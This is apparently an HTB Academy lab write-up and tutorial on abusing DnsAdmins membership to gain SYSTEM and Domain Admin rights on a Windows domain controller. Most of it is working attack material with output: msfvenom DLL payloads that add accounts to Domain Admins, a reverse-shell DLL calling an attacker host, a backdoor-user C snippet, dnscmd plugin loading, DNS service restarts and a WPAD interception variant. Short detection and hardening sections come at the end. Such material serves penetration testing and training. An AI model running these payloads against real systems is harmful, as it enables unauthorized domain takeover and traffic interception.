# DnsAdmins Group Privilege Escalation

## 🎯 Overview

**DnsAdmins group** members have access to DNS information and can manipulate DNS service configuration. Since the **Windows DNS service runs as NT AUTHORITY\SYSTEM**, membership in this group can be leveraged for **privilege escalation on Domain Controllers** or dedicated DNS servers through **custom DLL plugin injection**.

## 🔧 Attack Mechanism

### DNS Plugin Architecture
```cmd
# Key attack components:
- DNS management performed over RPC
- ServerLevelPluginDll registry key allows custom DLL loading
- Zero verification of DLL path or content
- DNS service restart loads the custom DLL as SYSTEM
- Full path specification required for successful exploitation
```

### Attack Flow
1. **Generate malicious DLL** (msfvenom or custom code)
2. **Host DLL** on accessible network share or local path
3. **Configure ServerLevelPluginDll** registry key via dnscmd
4. **Restart DNS service** to trigger DLL loading
5. **Execute payload** with SYSTEM privileges
6. **Clean up** registry and restore service

## 🔍 Group Membership Verification

### Check DnsAdmins Membership
```powershell
# Verify group membership
Get-ADGroupMember -Identity DnsAdmins

# Expected output:
distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109
```

### Alternative Verification
```cmd
# Check current user groups
whoami /groups

# Look for:
INLANEFREIGHT\DnsAdmins                         Group S-1-5-21-669053619-2741956077-1013132368-1103
```

## 💣 Custom DLL Generation

### Method 1: MSFVenom Payload
```bash
# Generate user addition payload
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

# Expected output:
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Payload size: 313 bytes
Final size of dll file: 5120 bytes
Saved as: adduser.dll
```

### Method 2: Reverse Shell Payload
```bash
# Generate reverse shell DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f dll -o revshell.dll

# Set up listener
nc -lnvp 443
```

### Method 3: Custom Mimilib.dll
```c
// Modified kdns.c for command execution
DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
    FILE * kdns_logfile;
    if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
    {
        klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
        fclose(kdns_logfile);
        system("net user hacker P@ssw0rd /add && net localgroup administrators hacker /add");
    }
    return ERROR_SUCCESS;
}
```

## 🌐 DLL Hosting and Delivery

### HTTP Server Method
```bash
# Start Python HTTP server
python3 -m http.server 7777

# Expected access log:
10.129.43.9 - - [19/May/2021 19:22:46] "GET /adduser.dll HTTP/1.1" 200 -

### Download to Target
```powershell
# Download DLL to target system
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"

# Alternative with Invoke-WebRequest
Invoke-WebRequest -Uri "http://10.10.15.152:1234/adduser.dll" -OutFile "C:\Users\netadm\Desktop\adduser.dll"
```

### SMB Share Method
```cmd
# Host on SMB share accessible by Domain Controller machine account
copy adduser.dll \\fileserver\share\adduser.dll
```

## 🔐 DNS Service Configuration

### Test Non-Privileged Access
```cmd
# Attempt DLL loading as normal user (should fail)
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

# Expected failure:
DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```

### Load DLL as DnsAdmins Member
```cmd
# Configure custom DLL path (requires full path)
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

# Expected success:
Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

### Alternative UNC Path
```cmd
# Use network share path
dnscmd.exe /config /serverlevelplugindll \\10.10.14.3\share\adduser.dll
```

## 🔄 DNS Service Manipulation

### Check Service Permissions

#### Find User SID
```cmd
# Get current user SID
wmic useraccount where name="netadm" get sid

# Expected output:
SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

#### Analyze Service Permissions
```cmd
# Check DNS service permissions using SDDL
sc.exe sdshow DNS

# Look for RPWP permissions (SERVICE_START and SERVICE_STOP):
D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

### Service Restart Sequence

#### Stop DNS Service
```cmd
# Stop DNS service
sc stop dns

# Expected output:
SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
```

#### Start DNS Service
```cmd
# Start DNS service (triggers DLL loading)
sc start dns

# Expected output:
SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        PID                : 6960
```

### Verify Privilege Escalation
```cmd
# Check if user was added to Domain Admins
net group "Domain Admins" /dom

# Expected result:
Group name     Domain Admins
Comment        Designated administrators of the domain

Members
-------------------------------------------------------------------------------
Administrator            netadm
```

## 🎯 HTB Academy Lab Solution

### Lab Environment
- **Credentials**: `netadm:HTB_@cademy_stdnt!`
- **Access Method**: RDP
- **Objective**: Leverage DnsAdmins membership to escalate privileges and retrieve flag

### Complete Step-by-Step Walkthrough

#### 1. Connect to Target via RDP
```bash
# Example target IP from HTB Academy
xfreerdp /v:10.129.43.42 /u:netadm /p:'HTB_@cademy_stdnt!'

# Expected output:
[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
```

#### 2. Generate Malicious DLL (On Pwnbox/Attack Machine)
```bash
# Generate DLL to add netadm to Domain Admins
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

# Expected output:
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 8704 bytes
Saved as: adduser.dll
```

#### 3. Start HTTP Server for DLL Delivery
```bash
# Start Python HTTP server on Pwnbox
python3 -m http.server 7777

# Expected output:
Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
```

#### 4. Download DLL to Target (PowerShell)
```powershell
# From RDP session, open PowerShell
# Download adduser.dll using wget
wget "http://10.10.14.80:7777/adduser.dll" -outfile "adduser.dll"

# Verify download
ls

# Expected output:
    Directory: C:\Users\netadm
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/19/2021   1:38 PM                Videos
-a----        10/3/2022   9:03 AM           8704 adduser.dll
```

#### 5. Configure DNS Plugin (Command Prompt)
```cmd
# Open Command Prompt from RDP session
# Load malicious DLL via dnscmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\adduser.dll

# Expected success message:
Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

#### 6. Restart DNS Service
```cmd
# Stop DNS service
sc stop dns

# Expected output:
SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530

# Start DNS service (triggers DLL execution)
sc start dns

# Expected output:
SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 6460
        FLAGS              :
```

#### 7. Verify Privilege Escalation
```cmd
# Check Domain Admins group membership
net group "Domain Admins" /dom

# Expected result (netadm should be added):
Group name     Domain Admins
Comment        Designated administrators of the domain

Members
-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

#### 8. Sign Out and Reconnect
```bash
# Sign out from current RDP session to refresh permissions
# Reconnect with same credentials
xfreerdp /v:10.129.43.42 /u:netadm /p:'HTB_@cademy_stdnt!'

# This step is important to refresh the session with new Domain Admin privileges
```

#### 9. Access Administrator Desktop and Retrieve Flag
```cmd
# Open Command Prompt with Domain Admin privileges
# Access the flag file
type C:\Users\Administrator\Desktop\DnsAdmins\flag.txt

# Submit the flag content to HTB Academy
```

### Key Success Indicators

1. **✅ DLL Generation**: 8704 bytes adduser.dll created successfully
2. **✅ HTTP Server**: Python server serving on port 7777
3. **✅ DLL Download**: adduser.dll present in C:\Users\netadm\
4. **✅ Registry Configuration**: "Registry property serverlevelplugindll successfully reset"
5. **✅ DNS Service Restart**: Both stop and start commands complete successfully
6. **✅ Privilege Escalation**: netadm appears in Domain Admins group
7. **✅ Administrator Access**: Can read files in C:\Users\Administrator\Desktop\DnsAdmins\

### Alternative Attack Methods

#### Method A: Direct Administrator Access
```bash
# Generate DLL for direct access
msfvenom -p windows/x64/exec cmd='copy c:\Users\Administrator\Desktop\DnsAdmins\flag.txt c:\Users\netadm\Desktop\flag.txt' -f dll -o getflag.dll
```

#### Method B: Service Account Technique
```bash
# Generate DLL to enable RDP for netadm
msfvenom -p windows/x64/exec cmd='net localgroup "Remote Desktop Users" netadm /add' -f dll -o rdp.dll
```

## 🧹 Cleanup and Restoration

### ⚠️ Important Considerations
```cmd
# WARNING: This is a destructive attack
- Only perform with explicit client permission
- DNS service disruption affects entire domain
- Always have cleanup plan ready
- Document all changes made
```

### Registry Cleanup

#### Verify Registry Key
```cmd
# Check if ServerLevelPluginDll key exists
reg query \\[DC_IP]\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

# Look for:
ServerLevelPluginDll    REG_SZ    adduser.dll
```

#### Remove Registry Key
```cmd
# Delete the malicious registry entry
reg delete \\[DC_IP]\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll

# Confirm deletion:
Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.
```

### Service Restoration
```cmd
# Restart DNS service cleanly
sc.exe start dns

# Verify service is running
sc query dns

# Expected output:
SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
```

### DNS Functionality Test
```cmd
# Test DNS resolution
nslookup localhost
nslookup domain.com

# Verify DNS is working correctly
```

## 🌐 WPAD Attack Alternative

### Global Query Block List Manipulation

#### Disable Global Query Block
```powershell
# Disable global query block list
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

#### Create WPAD Record
```powershell
# Add WPAD record pointing to attack machine
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

#### Traffic Interception
```bash
# Set up Responder for traffic capture
responder -I eth0 -A

# Alternative: Use Inveigh
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -Proxy Y
```

## 🔍 Detection Indicators

### Registry Monitoring
```cmd
# Monitor for registry changes:
HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll

# Event IDs to watch:
Event ID 4657 - Registry value modified
Event ID 4656 - Handle to object requested
```

### Service Activity
```cmd
# Suspicious activities:
- DNS service stops/starts outside maintenance windows
- dnscmd.exe execution by non-administrative users
- Custom DLL files in DNS-related directories
- Network connections from DNS service process
```

### Network Indicators
```cmd
# Traffic patterns:
- HTTP requests for DLL files from Domain Controllers
- SMB connections to unusual shares
- DNS queries to non-standard records (WPAD)
```

## 🛡️ Defense Strategies

### Group Membership Hardening
```cmd
# Regular audits:
- Review DnsAdmins group membership quarterly
- Remove unnecessary accounts
- Implement least-privilege principles
- Use dedicated DNS management accounts
```

### DNS Service Protection
```cmd
# Security measures:
- Enable DNS audit logging
- Monitor ServerLevelPluginDll registry key
- Implement application whitelisting
- Restrict DNS service permissions
```

### Detection Rules
```cmd
# Deploy monitoring for:
- DnsAdmins group modifications
- dnscmd.exe execution
- DNS service restart events
- Custom DLL loading by DNS service
```

## 📋 DnsAdmins Exploitation Checklist

### Prerequisites
- [ ] **DnsAdmins membership** verified
- [ ] **DNS service permissions** confirmed (RPWP)
- [ ] **Domain Controller access** available
- [ ] **Client permission** obtained for destructive testing

### DLL Generation
- [ ] **Malicious DLL created** (msfvenom or custom)
- [ ] **Payload tested** in lab environment
- [ ] **Hosting method** prepared (HTTP/SMB)
- [ ] **Full path** available for DLL specification

### Service Exploitation
- [ ] **Registry key configured** (`dnscmd /config /serverlevelplugindll`)
- [ ] **DNS service stopped** (`sc stop dns`)
- [ ] **DNS service started** (`sc start dns`)
- [ ] **Privilege escalation verified** (group membership/access)

### Flag Retrieval
- [ ] **Administrator access** confirmed
- [ ] **Flag file accessed** (`c:\Users\Administrator\Desktop\DnsAdmins\flag.txt`)
- [ ] **Flag content** extracted and submitted

### Cleanup
- [ ] **Registry key removed** (ServerLevelPluginDll)
- [ ] **DNS service restored** (clean restart)
- [ ] **DNS functionality verified** (nslookup tests)
- [ ] **Changes documented** for client reporting

## 💡 Key Takeaways

1. **DnsAdmins membership** enables SYSTEM-level code execution on DNS servers
2. **Custom DLL injection** through ServerLevelPluginDll registry key
3. **DNS service restart** required to trigger malicious DLL loading
4. **Full path specification** mandatory for successful exploitation
5. **Destructive nature** requires careful coordination with client
6. **Domain Controller impact** - DNS disruption affects entire domain
7. **Multiple attack vectors** - user addition, reverse shells, WPAD attacks
8. **Cleanup essential** - registry restoration and service stability

---

*DnsAdmins group privilege escalation represents one of the most powerful Windows built-in group attacks, capable of achieving Domain Admin privileges through DNS service manipulation.* 